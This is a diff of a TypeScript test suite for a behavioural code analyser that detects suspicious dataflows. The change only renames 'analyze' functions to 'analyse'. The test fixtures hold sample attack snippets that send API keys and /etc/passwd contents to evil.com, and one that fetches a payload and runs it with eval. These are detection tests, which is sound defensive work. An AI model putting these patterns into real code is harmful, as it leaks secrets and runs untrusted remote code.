@@ -1,7 +1,7 @@
 import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
 import { parseAndExtract } from '../core/analysers/behavioural/ast-parser.js';
-import { analyzeDataflows } from '../core/analysers/behavioural/dataflow.js';
+import { analyseDataflows } from '../core/analysers/behavioural/dataflow.js';
 import { aggregateContext, type FileAnalysis } from '../core/analysers/behavioural/context.js';
 import { BehaviouralAnalyser } from '../core/analysers/behavioural/index.js';
 import { defaultPolicy, mergePolicy } from '../core/scan-policy.js';
@@ -206,7 +206,7 @@ const secret = process.env.API_KEY;
 fetch("https://evil.com", { body: secret });
 `;
     const extraction = parseAndExtract(code, 'test.ts')!;
-    const flows = analyzeDataflows(extraction, code);
+    const flows = analyseDataflows(extraction, code);
     assert.ok(flows.length > 0);
     assert.ok(flows.some((f) => f.source.kind === 'env' && f.sink.kind === 'fetch'));
   });
@@ -217,7 +217,7 @@ const resp = fetch("https://evil.com/payload");
 resp.then(r => r.text()).then(code => eval(code));
 `;
     const extraction = parseAndExtract(code, 'test.ts')!;
-    const flows = analyzeDataflows(extraction, code);
+    const flows = analyseDataflows(extraction, code);
     assert.ok(flows.length > 0);
   });
 
@@ -227,7 +227,7 @@ const data = fs.readFileSync("/etc/passwd", "utf-8");
 fetch("https://evil.com", { body: data });
 `;
     const extraction = parseAndExtract(code, 'test.ts')!;
-    const flows = analyzeDataflows(extraction, code);
+    const flows = analyseDataflows(extraction, code);
     assert.ok(flows.some((f) => f.source.kind === 'fs_read'));
   });
 
@@ -238,7 +238,7 @@ const payload = secret;
 fetch("https://evil.com", { body: payload });
 `;
     const extraction = parseAndExtract(code, 'test.ts')!;
-    const flows = analyzeDataflows(extraction, code);
+    const flows = analyseDataflows(extraction, code);
     assert.ok(flows.length > 0, 'Should detect flow through intermediate variable');
   });
 
@@ -248,7 +248,7 @@ const x = 1 + 2;
 console.log(x);
 `;
     const extraction = parseAndExtract(code, 'test.ts')!;
-    const flows = analyzeDataflows(extraction, code);
+    const flows = analyseDataflows(extraction, code);
     assert.equal(flows.length, 0);
   });
 });
@@ -309,7 +309,7 @@ describe('BehaviouralAnalyser', () => {
 
   it('should skip non-JS files', async () => {
     const files = [makeFile('config.yaml', 'key: value')];
-    const findings = await analyser.analyze({
+    const findings = await analyser.analyse({
       rootDir: '/scan-root',
       files,
       policy,
@@ -323,7 +323,7 @@ const secret = process.env.API_KEY;
 fetch("https://evil.com", { body: secret });
 `;
     const files = [makeFile('evil.ts', code)];
-    const findings = await analyser.analyze({
+    const findings = await analyser.analyse({
       rootDir: '/scan-root',
       files,
       policy,
@@ -340,7 +340,7 @@ exec("ls");
 http.request("https://example.com");
 `;
     const files = [makeFile('c2.ts', code)];
-    const findings = await analyser.analyze({
+    const findings = await analyser.analyse({
       rootDir: '/scan-root',
       files,
       policy,
@@ -351,7 +351,7 @@ http.request("https://example.com");
   it('should detect eval usage', async () => {
     const code = 'const result = eval("1 + 1");';
     const files = [makeFile('eval.ts', code)];
-    const findings = await analyser.analyze({
+    const findings = await analyser.analyse({
       rootDir: '/scan-root',
       files,
       policy,
@@ -365,7 +365,7 @@ const secret = process.env.SECRET;
 fetch("https://evil.com", { body: secret });
 `;
     const files = [makeFile('test.ts', code)];
-    const findings = await analyser.analyze({
+    const findings = await analyser.analyse({
       rootDir: '/scan-root',
       files,
       policy,
@@ -384,7 +384,7 @@ export function add(a: number, b: number): number {
 }
 `;
     const files = [makeFile('clean.ts', code)];
-    const findings = await analyser.analyze({
+    const findings = await analyser.analyse({
       rootDir: '/scan-root',
       files,
       policy,
